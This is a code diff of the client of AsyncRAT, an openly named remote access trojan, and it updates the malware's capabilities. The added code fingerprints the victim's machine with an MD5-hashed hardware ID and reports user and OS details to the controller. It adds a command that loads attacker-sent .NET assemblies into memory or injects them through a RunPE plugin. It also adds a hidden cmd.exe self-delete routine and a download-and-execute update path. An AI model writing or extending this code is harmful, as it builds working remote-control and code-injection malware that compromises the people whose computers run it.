@@ -8,6 +8,10 @@ using System.Net.Sockets;
 using System.Text;
 using System.Threading;
 using System.Windows.Forms;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Security.Cryptography;
+
 
 //       │ Author     : NYAN CAT
 //       │ Name       : AsyncRAT // Simple Socket
@@ -22,8 +26,8 @@ namespace Client
     class Settings
     {
         public static readonly string IP = "127.0.0.1";
-        public static readonly int Port = 8080;
-        public static readonly string Version = "0.2.1";
+        public static readonly int Port = 6606;
+        public static readonly string Version = "0.2.2";
     }
 
     class Program
@@ -97,13 +101,35 @@ namespace Client
             InitializeClient();
         }
 
-        public static byte[] SendInfo()
+        private static byte[] SendInfo()
         {
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "ClientInfo";
+            msgpack.ForcePathObject("HWID").AsString = HWID();
             msgpack.ForcePathObject("User").AsString = Environment.UserName.ToString();
-            msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString();
+            msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString()+ " " + Environment.Is64BitOperatingSystem.ToString().Replace("True","64bit").Replace("False","32bit");
             return msgpack.Encode2Bytes();
+        }
+
+        private static string HWID()
+        {
+            StringBuilder sb = new StringBuilder();
+            sb.Append(Environment.UserDomainName);
+            sb.Append(Environment.UserName);
+            sb.Append(Environment.MachineName);
+            sb.Append(Environment.Version);
+            return GetHash(sb.ToString());
+        }
+
+        private static string GetHash(string strToHash)
+        {
+            MD5CryptoServiceProvider md5Obj = new MD5CryptoServiceProvider();
+            byte[] bytesToHash = Encoding.ASCII.GetBytes(strToHash);
+            bytesToHash = md5Obj.ComputeHash(bytesToHash);
+            StringBuilder strResult = new StringBuilder();
+            foreach (byte b in bytesToHash)
+                strResult.Append(b.ToString("x2"));
+            return strResult.ToString().Substring(0, 12).ToUpper();
         }
 
         public static void ReadServertData(IAsyncResult ar)
@@ -179,7 +205,6 @@ namespace Client
                 {
                     case "sendMessage":
                         {
-                            Received();
                             MessageBox.Show(unpack_msgpack.ForcePathObject("Message").AsString);
                         }
                         break;
@@ -196,10 +221,35 @@ namespace Client
                             string FullPath = Path.GetTempFileName() + unpack_msgpack.ForcePathObject("Extension").AsString;
                             unpack_msgpack.ForcePathObject("File").SaveBytesToFile(FullPath);
                             Process.Start(FullPath);
+                            if (unpack_msgpack.ForcePathObject("Update").AsString == "true")
+                            {
+                                Uninstall();
+                            }
                         }
                         break;
 
-                    case "closeConnection":
+                    case "sendMemory":
+                        {
+                            Received();
+                            byte[] Buffer = unpack_msgpack.ForcePathObject("File").GetAsBytes();
+                            string Injection = unpack_msgpack.ForcePathObject("Inject").AsString;
+                            byte[] Plugin = unpack_msgpack.ForcePathObject("Plugin").GetAsBytes();
+                            object[] parameters = new object[] { Buffer, Injection, Plugin };
+                            Thread thread = null;
+                            if (Injection.Length == 0)
+                            {
+                                 thread = new Thread(new ParameterizedThreadStart(SendToMemory));
+                            }
+                            else
+                            {
+                                 thread = new Thread(new ParameterizedThreadStart(RunPE));
+                            }
+                            thread.Start(parameters);
+
+                        }
+                        break;
+
+                    case "close":
                         {
                             try
                             {
@@ -207,6 +257,12 @@ namespace Client
                             }
                             catch { }
                             Environment.Exit(0);
+                        }
+                        break;
+
+                    case "uninstall":
+                        {
+                            Uninstall();
                         }
                         break;
                 }
@@ -221,19 +277,68 @@ namespace Client
             BeginSend(msgpack.Encode2Bytes());
         }
 
-        public static void Ping(object obj)
+        private static void Uninstall()
+        {
+            ProcessStartInfo Del = null;
+            try
+            {
+                Del = new ProcessStartInfo()
+                {
+                    Arguments = "/C choice /C Y /N /D Y /T 1 & Del " + Process.GetCurrentProcess().MainModule.FileName,
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    CreateNoWindow = true,
+                    FileName = "cmd.exe"
+                };
+
+                Client.Shutdown(SocketShutdown.Both);
+                Client.Close();
+            }
+            catch { }
+            finally
+            {
+                Process.Start(Del);
+                Environment.Exit(0);
+            }
+        }
+
+        private static void SendToMemory(object obj)
+        {
+            object[] Obj = (object[])obj;
+            var Buffer = (byte[])Obj[0];
+            var Injection = (string)Obj[1];
+            Assembly Loader = Assembly.Load(Buffer);
+            object[] Parameters = null;
+            if (Loader.EntryPoint.GetParameters().Length > 0)
+            {
+                Parameters = new object[] { new string[] { null } };
+            }
+            Loader.EntryPoint.Invoke(null, Parameters);
+
+        }
+
+        private static void RunPE(object obj)
         {
             try
             {
-                MsgPack msgpack = new MsgPack();
-                msgpack.ForcePathObject("Packet").AsString = "Ping";
-                msgpack.ForcePathObject("Message").AsString = DateTime.Now.ToLongTimeString().ToString();
-                BeginSend(msgpack.Encode2Bytes());
+                object[] Parameters = (object[])obj;
+                byte[] File = (byte[])Parameters[0];
+                string Injection = Convert.ToString(Parameters[1]);
+                byte[] Plugin = (byte[])Parameters[2];
+                Assembly Loader = Assembly.Load(Plugin);
+                Loader.GetType("Plugin.Program").GetMethod("Run").Invoke(null, new object[] { File, Path.Combine(RuntimeEnvironment.GetRuntimeDirectory(), Injection) });
             }
             catch { }
         }
 
-        public static void BeginSend(byte[] Msgs)
+        public static void Ping(object obj)
+        {
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Packet").AsString = "Ping";
+                msgpack.ForcePathObject("Message").AsString = DateTime.Now.ToLongTimeString().ToString();
+                BeginSend(msgpack.Encode2Bytes());
+        }
+
+        public static void BeginSend(byte[] buffer)
         {
             lock (SendSync)
             {
@@ -243,7 +348,6 @@ namespace Client
                     {
                         using (MemoryStream MS = new MemoryStream())
                         {
-                            byte[] buffer = Msgs;
                             byte[] buffersize = Encoding.UTF8.GetBytes(buffer.Length.ToString() + Strings.ChrW(0));
                             MS.Write(buffersize, 0, buffersize.Length);
                             MS.Write(buffer, 0, buffer.Length);
